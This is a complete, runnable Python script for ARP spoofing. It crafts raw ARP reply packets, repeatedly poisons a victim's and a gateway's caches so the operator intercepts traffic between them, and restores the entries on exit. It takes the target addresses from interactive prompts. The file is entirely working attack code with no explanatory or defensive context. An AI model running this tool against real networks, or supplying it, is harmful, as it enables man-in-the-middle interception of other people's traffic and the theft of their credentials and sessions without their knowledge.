import socket 
import struct
import fcntl
import time


class errors():
    permission_error = 'You must be root!'
    os_error = 'No such device '
    value_mac_error = 'Bad mac address. Example of correct mac address "00:00:00:00:00:00"'
    value_ip_error = 'Bad ip address. Example of correct ip address "192.168.0.0"'


class arpspoof():
    def __init__(self, interface : str) -> None:
        try:
            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            self.sock.bind((interface, 0x0806))
        except PermissionError:
            raise PermissionError(errors.permission_error)
        except OSError:
            raise OSError(errors.os_error + interface)
        
        self.interface = interface
        self.arp_type = b'\x08\x06'
        self.oper_request = b'\x00\x01'
        self.oper_answer = b'\x00\x02'

        htype = b'\x00\x01' # Ethernet
        ptype = b'\x08\x00' # IPv4
        hlen = b'\x06'
        plen = b'\x04'

        self.part_of_payload = htype + ptype + hlen + plen

    def send_packet(self, isOperRequest : bool, SHA : bytes, SPA : bytes, THA : bytes, TPA : bytes) -> None:
        if isOperRequest == True: 
            oper = self.oper_request
        else: 
            oper = self.oper_answer

        packet = THA + SHA + self.arp_type
        packet += self.part_of_payload + oper
        packet += SHA + SPA + THA + TPA
        
        self.sock.send(packet)

    def get_own_ip(self) -> bytes:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packed_iface = struct.pack('256s', self.interface.encode('utf_8'))
        packed_addr = fcntl.ioctl(sock.fileno(), 0x8915, packed_iface)[20:24]
        sock.close()
        return packed_addr

    def get_own_mac(self) -> bytes:
        return self.sock.getsockname()[4]
    
    def start_arpspoofing(self, victim_ip : bytes, victim_mac : bytes, gateway_ip : bytes, gateway_mac : bytes):
        own_ip = self.get_own_ip()
        own_mac = self.get_own_mac()
        try:
            while True:
                self.send_packet(False, own_mac, gateway_ip, victim_mac, victim_ip)
                print('[*] Send ARP bad packet to victim')
                self.send_packet(False, own_mac, victim_ip, gateway_mac, gateway_ip)
                print('[*] Send ARP bad packet to gateway')
                time.sleep(3)
        except KeyboardInterrupt:
            for _ in range(3):
                self.send_packet(False, gateway_mac, gateway_ip, victim_mac, victim_ip)
                print('[*] Send ARP normal packet to victim')
                self.send_packet(False, victim_mac, victim_ip, gateway_mac, gateway_ip)
                print('[*] Send ARP normal packet to gateway')
        

def mac_from_string_to_bytes(mac : str) -> bytes:
    try:
        result = bytes.fromhex(mac.lower().replace(':', ' '))
    except ValueError:
        raise ValueError(errors.value_mac_error)
    return result

def ipv4_from_string_to_bytes(ip : str) -> bytes:
    try:
        result = socket.inet_aton(ip)
    except OSError:
        raise ValueError(errors.value_ip_error)
    return result


if __name__ == "__main__":
    interface = input('interface>>>')
    victim_ip = ipv4_from_string_to_bytes(input('victim_ip>>>'))
    victim_mac = mac_from_string_to_bytes(input('victim_mac>>>'))
    gateway_ip = ipv4_from_string_to_bytes(input('gateway_ip>>>'))
    gateway_mac = mac_from_string_to_bytes(input('gateway_mac>>>'))

    spoof = arpspoof(interface)
    spoof.start_arpspoofing(victim_ip, victim_mac, gateway_ip, gateway_mac)
    spoof.sock.close()
